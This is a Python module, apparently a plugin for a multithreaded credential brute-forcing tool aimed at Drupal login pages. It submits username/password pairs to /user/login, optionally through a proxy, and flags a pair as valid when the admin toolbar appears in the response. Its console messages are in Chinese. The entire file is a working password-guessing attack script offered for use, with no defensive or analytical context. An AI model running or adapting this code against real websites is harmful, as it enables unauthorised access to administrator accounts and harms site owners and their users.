import requests
import threading
from lib.log import MyLogger

threadingLock = threading.Lock()
def run(items):
    url,user_agent,proxy,username, password=items
    url=url.strip("/")
    logurl=url+'/user/login'
    header = {'User-Agent': user_agent}

    sesion = requests.session()
    data = {
        "name": username,
        "pass": password,
        "form_build_id": 'form-dLmsWkfQ_wEGAoB-UQNpNc_ZDU1eB8aQIAihkVo5zy4',
        "form_id": 'user_login_form',
        "op": 'Log+in'
    }

    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = sesion.post(logurl, headers=header, data=data, proxies=proxies)
    else:
        response = sesion.post(logurl, headers=header, data=data)

    threadingLock.acquire()
    print(u'\r[#] 正在尝试凭据：'+username+"    "+password+' '*10,end='')
    # MyLogger.debug("正在尝试凭据："+username+" "+password)
    if response.status_code==200 and "Toolbar items" in response.text and 'Administration menu' in response.text:
        MyLogger.success("有效凭据："+username+" "+password)
        threadingLock.release()
        return {username:password}
    else:
        print(u'\r[#] 无效凭据：' + username + "    " + password+' '*10, end='')
        # MyLogger.debug("无效凭据："+username+" "+password)
        threadingLock.release()





